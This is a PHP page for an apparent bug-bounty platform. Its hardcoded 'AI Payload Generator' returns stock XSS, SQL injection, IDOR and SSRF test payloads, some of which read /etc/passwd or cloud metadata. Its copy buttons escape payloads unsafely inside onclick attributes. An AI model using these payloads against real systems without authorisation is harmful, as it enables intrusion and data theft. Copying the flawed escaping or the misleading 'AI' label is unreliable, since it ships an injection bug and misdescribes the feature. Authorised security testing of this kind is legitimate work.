<?php
require 'config.php';

if (!isset($_SESSION['user_id']) || $_SESSION['role'] != 'hacker') {
    header("Location: login.php");
    exit;
}

$generated_payloads = null;
$bug_type   = $_POST['bug_type'] ?? '';
$input_param= $_POST['input_param'] ?? '';
$context    = $_POST['context'] ?? '';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $bug_lower = strtolower($bug_type);
    $payloads = [];
    $tips = "";

    if (strpos($bug_lower, 'xss') !== false) {
        $payloads = [
            '"><script>alert(document.domain)</script>',
            '"><img src=x onerror=alert(1)>',
            'javascript:alert(document.cookie)',
            '"><svg onload=alert(document.domain)>',
            '\';confirm(document.domain);//'
        ];
        $tips = "Uji payload pada parameter input teks, form komentar, atau kolom pencarian. Perhatikan apakah input direfleksikan tanpa sanitasi (Stored/Reflected XSS).";
    } elseif (strpos($bug_lower, 'sqli') !== false || strpos($bug_lower, 'sql') !== false) {
        $payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1, @@version, 3, 4 -- -",
            "1' AND SLEEP(5) -- -",
            "admin' --",
            "1 OR 1=1 ORDER BY 1--"
        ];
        $tips = "Uji pada parameter ID, filter pencarian, atau halaman login. Perhatikan respons error SQL atau jeda waktu respon (Time-Based).";
    } elseif (strpos($bug_lower, 'idor') !== false) {
        $payloads = [
            "Ubah ID objek (misal: user_id=1001 menjadi 1002)",
            "Ganti nilai UUID/token objek dengan milik akun lain",
            "Tambahkan array parameter: id[]=1&id[]=2"
        ];
        $tips = "Gunakan dua akun berbeda (Akun A dan Akun B). Tangkap request HTTP dengan Burp Suite dan tukar identifier kepemilikan resource.";
    } elseif (strpos($bug_lower, 'ssrf') !== false) {
        $payloads = [
            "http://127.0.0.1:80/",
            "http://localhost:22/",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd"
        ];
        $tips = "Cari fitur webhooks, unduh gambar dari URL, atau pemindai tautan eksternal. Arahkan target ke server lokal atau metadata cloud.";
    } else {
        $payloads = [
            "Custom Test Payload 1: <script>console.log('test')</script>",
            "Custom Test Payload 2: ' OR 1=1 --",
            "Directory Traversal: ../../../../etc/passwd"
        ];
        $tips = "Lakukan pengujian bertahap dengan memanipulasi parameter masukan pada aplikasi target.";
    }

    $generated_payloads = [
        'bug_type' => $bug_type,
        'payloads' => $payloads,
        'tips'     => $tips
    ];

    log_activity($conn, $_SESSION['user_id'], "AI_PAYLOAD_GEN", "Hacker menggunakan AI Payload Generator untuk: $bug_type");
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Payload Generator - HackerCrowd Project</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Archivo:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/svg+xml" href="assets/img/logo.svg">
    <link rel="stylesheet" href="assets/css/app.css">
</head>
<body>

<nav class="navbar navbar-expand-lg navbar-dark bg-slate-900 px-4 py-3 border-bottom border-secondary">
    <a class="navbar-brand fw-bold" href="index.php">
        <i class="bi bi-shield-lock-fill text-success fs-3 me-2"></i> Hacker<span class="text-success">Crowd</span> Project
    </a>
    <div class="ms-auto d-flex align-items-center">
        <a href="ai_assistant.php" class="btn btn-outline-warning btn-sm me-2 rounded-pill px-3"><i class="bi bi-file-earmark-text"></i> AI Bug Report</a>
        <a href="dashboard.php" class="btn btn-outline-light btn-sm me-2 rounded-pill px-3"><i class="bi bi-speedometer2"></i> Dashboard</a>
        <a href="logout.php" class="btn btn-danger btn-sm rounded-pill px-3"><i class="bi bi-box-arrow-right"></i> Logout</a>
    </div>
</nav>

<div class="container my-5" style="max-width: 800px;">
    <div class="text-center mb-5">
        <div class="bg-warning bg-opacity-10 text-warning rounded-circle d-inline-flex p-3 mb-3 border border-warning border-opacity-25 shadow">
            <i class="bi bi-code-slash display-5"></i>
        </div>
        <h2 class="fw-bold text-white">AI Payload & Exploit Generator 🧪</h2>
        <p class="text-secondary opacity-75">Hasilkan rekomendasi payload dan strategi pengujian spesifik untuk jenis kerentanan yang sedang Anda uji.</p>
    </div>

    <div class="ai-card p-4 shadow-lg mb-5">
        <form method="POST">
            <div class="mb-3">
                <label class="form-label text-light small fw-bold">Jenis Kerentanan (Contoh: XSS, SQLi, IDOR, SSRF)</label>
                <input type="text" name="bug_type" class="form-control bg-dark text-white border-secondary" placeholder="Masukkan jenis celah..." value="<?= htmlspecialchars($bug_type) ?>" required>
            </div>
            <div class="mb-3">
                <label class="form-label text-light small fw-bold">Parameter Target (Opsional)</label>
                <input type="text" name="input_param" class="form-control bg-dark text-white border-secondary" placeholder="Contoh: ?id=, ?search=" value="<?= htmlspecialchars($input_param) ?>">
            </div>
            <button type="submit" class="btn btn-warning w-100 py-2 fw-bold text-dark rounded-3 shadow">
                <i class="bi bi-cpu me-1"></i> Generate Payload AI
            </button>
        </form>
    </div>

    <?php if ($generated_payloads): ?>
    <div class="ai-card p-4 shadow-lg border-warning border-2">
        <h4 class="fw-bold text-warning mb-3"><i class="bi bi-terminal me-2"></i>Rekomendasi Payload untuk: <?= htmlspecialchars($generated_payloads['bug_type']) ?></h4>
        <hr class="border-secondary mb-3">
        
        <div class="mb-4">
            <label class="small text-secondary fw-bold mb-2">Daftar Payload Siap Uji:</label>
            <div class="p-3 code-box">
                <?php foreach($generated_payloads['payloads'] as $p): ?>
                    <div class="d-flex justify-content-between align-items-center mb-2 pb-2 border-bottom border-secondary last-border-0">
                        <span class="text-success"><?= htmlspecialchars($p) ?></span>
                        <button class="btn btn-sm btn-outline-success py-0 px-2" onclick="navigator.clipboard.writeText('<?= addslashes($p) ?>')"><i class="bi bi-copy"></i> Copy</button>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>

        <div>
            <label class="small text-secondary fw-bold">Tips Pengujian Keamanan:</label>
            <div class="p-3 bg-dark border border-secondary rounded-3 text-light small">
                <?= htmlspecialchars($generated_payloads['tips']) ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://unpkg.com/lenis@1.1.18/dist/lenis.min.js"></script>
<script src="assets/js/app.js"></script>
</body>
</html>